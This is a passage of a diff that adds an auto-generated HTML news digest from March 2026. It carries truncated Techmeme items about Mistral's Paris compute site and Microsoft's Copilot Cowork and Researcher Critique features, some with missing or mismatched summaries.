+Kuroir Theme
+Lazy
+Mono Industrial
+Monokai
+Night Owl
+Nord
+Oceanic Next
+Pastels on Dark
+Slush and Poppies
+Solarized Dark
+Solarized Light
+Space Cadet
+Tomorrow Night Blue
+Tomorrow Night Bright
+Tomorrow Night Eighties
+Tomorrow Night
+Tomorrow
+Vibrant Ink
+Xcode Default
+Font Size:
+Font Ligatures</p>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://www.codingfont.com/">https://www.codingfont.com/</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-7">
+            <h2>CEO @arthurmensch says: “Scaling our infrastructure in Europe is critical to empower our customers and to ensure AI innovation and autonomy remain at the heart of Europe”.</h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">97 points</span> • March 30, 2026</div>
+            <div class="article-content">
+                
+            <div class="summary-only">
+                <p><em>Full article not available - showing summary only.</em></p>
+                <p>No summary available.</p>
+            </div>
+            
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=d7bb34f411&amp;e=8d40e66a6d">https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=d7bb34f411&amp;e=8d40e66a6d</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-8">
+            <h2>• First site near Paris to launch by June.  13,800 top-end Nvidia GB300 chips  • Mistral&#39;s full-stack AI pitch (offering both models + infrastructure: software + compute) will be attractive to busines</h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">94 points</span> • March 30, 2026</div>
+            <div class="article-content">
+                
+            <div class="summary-only">
+                <p><em>Full article not available - showing summary only.</em></p>
+                <p>No summary available.</p>
+            </div>
+            
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=1263cccf9a&amp;e=8d40e66a6d">https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=1263cccf9a&amp;e=8d40e66a6d</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-9">
+            <h2>It also 20x&#39;ed revenue in the last year and is on track to surpass $1bn by the of the 2026</h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">91 points</span> • March 30, 2026</div>
+            <div class="article-content">
+                
+            <div class="summary-only">
+                <p><em>Full article not available - showing summary only.</em></p>
+                <p>Microsoft rolls out Copilot Cowork to its Frontier program for early-stage testing, including a new Researcher Critique tool using Anthropic and OpenAI models ( Jared Spataro / Microsoft 365 Blog ) @patrickmoorhead: Council is pretty awesome.  I use it on Perplexity, but if you&#39;re an enterprise, this is a better choice as it&#39;s locked down.  [Quotes @satyanadella&#39;s post “New in M365 Copilot: Council.  You can run multiple models on the same prompt at the same time, so you can see where they align</p>
+            </div>
+            
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=55fa1d9c90&amp;e=8d40e66a6d">https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=55fa1d9c90&amp;e=8d40e66a6d</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-10">
+            <h2>Microsoft rolls out Copilot Cowork to its Frontier program for early-stage testing, including a new Researcher Critique tool using Anthropic and OpenAI models</h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">88 points</span> • March 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body><p><a href="https://www.microsoft.com/en-us/microsoft-365-copilot">Microsoft 365 Copilot</a> is your AI for work. It’s built on a multi‑model advantage—bringing the best AI innovation from across the industry into your tenant, grounded in the knowledge of <a href="https://techcommunity.microsoft.com/blog/microsoft365copilotblog/a-closer-look-at-work-iq/4499789">Work IQ</a> and protected with Enterprise Data Protection. Copilot is a system for work that puts that intelligence directly into the apps and workflows where work already happens, enabling you to put AI to use—from simple tasks to full, multi‑step workflows. This is a pattern that will only become more powerful as new models and new ways of working continue to emerge. Today, we are excited to announce new innovation that moves us forward on this <a href="https://blogs.microsoft.com/blog/2026/03/09/introducing-the-first-frontier-suite-built-on-intelligence-trust/">Frontier Transformation</a>. </p><p>We <a href="https://www.microsoft.com/en-us/microsoft-365/blog/2026/03/09/powering-frontier-transformation-with-copilot-and-agents/">recently shared</a> that we’re bringing the technology platform that powers Claude Cowork into Microsoft 365 Copilot. <strong>Today, </strong><strong>Copilot Cowork</strong><strong>—designed for long-running, multi-step work in Microsoft 365—is available via the Frontier program.</strong><a href="https://www.microsoft.com/en-us/microsoft-365-copilot/frontier-program">Join Frontier</a> to get early access to Microsoft’s latest AI innovations and <a href="https://learn.microsoft.com/en-us/copilot/microsoft-365/cowork/">learn more about Copilot Cowork here</a>.</p><p>Copilot Cowork makes it easy to delegate and complete work. Describe the outcome you want, and Copilot Cowork creates a plan, reasons across your tools and files, and carries work forward with visible progress and opportunities to steer. With skills from Claude and Microsoft built in, such as calendar management and daily briefing, Copilot Cowork can handle everything from one-off tasks to repeatable workflows like a monthly budget review. Organizations like Capital Group had early access to Copilot Cowork and report already seeing its value—from planning, scheduling, and creating deliverables to preparing for executive reviews.</p><blockquote><p>We have been using Copilot since its launch in 2024, and the new capabilities in Cowork will help us automate and scale the Copilot ecosystem. This isn’t about generating content or answers. It’s about taking real action—connecting steps, coordinating tasks, and following through across everyday workflows. Because Cowork operates on our enterprise data and within our security and risk boundaries, we can experiment, learn, and scale with confidence. That allows us to move faster and focus AI in places where it actually delivers value.</p>Barton Warner, SVP of Enterprise Technology at Capital Group.</blockquote><p>We are also excited to announce new features in<strong> Researcher </strong>built on multi-model intelligence. Today, Researcher helps you tackle your most complex questions by synthesizing information across sources, generating comprehensive analysis, and delivering cited, well-reasoned responses you can act on with confidence. </p><p>Researcher’s new <strong>Critique</strong> feature takes this even further, using a combination of models from Frontier labs including Anthropic and OpenAI to separate generation from evaluation. One model plans the task and creates an initial draft, while a second model focuses on refinement, acting as an expert reviewer before the final report is produced.</p><p>The results are measurable—Researcher now scores 13.8% higher on the Deep Research Accuracy, Completeness, and Objectivity, or DRACO benchmark, the industry standard for deep research quality.</p><graphic src="https://www.microsoft.com/en-us/microsoft-365/blog/wp-content/uploads/sites/2/2026/03/M365-Blog_03302026_CopilotResearcherCritique-1024x616.webp" alt="Bar chart titled “DRACO Benchmark for Deep Research Quality” comparing research model scores, with “Researcher with Critique” highest at 57.4 and other models ranging from 25.3 to 50.4."/><p>And with Researcher’s new model Council, you can compare responses from different models side by side, instantly seeing where they agree, where they diverge, and what each uniquely brings to the table. It’s like having multiple researchers at your fingertips. Learn more <a href="https://techcommunity.microsoft.com/blog/microsoft365copilotblog/introducing-the-new-and-improved-researcher-%E2%80%93-powered-by-multi-model-intelligenc/4506011">here</a>. </p><h2><strong>Get started today</strong> </h2>
+
+
+
+<p>All of this innovation is part of Wave 3 of Microsoft 365 Copilot, which marks a turning point in how AI shows up at work: intelligence that understands the context of work, and trust that allows AI to scale safely across the workforce. When intelligence and trust move together, AI stops being an experiment and starts becoming how work gets done. Visit <a href="http://microsoft365.com/copilot">Microsoft365.com/copilot</a> or download the Microsoft 365 app on your mobile device to get started. </p></body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=0cc3adc00d&amp;e=8d40e66a6d">https://techmeme.us14.list-manage.com/track/click?u=94ccd3ae223561415b05892ab&amp;id=0cc3adc00d&amp;e=8d40e66a6d</a>
+            </div>
+            
+        </article>
+        
+    </main>
+    
+    <footer>
+        
+        <p>Generated: March 31, 2026 at 06:15 UTC</p>
+        <p>Kindle News Digest</p>
+    </footer>
+</body>
+</html>
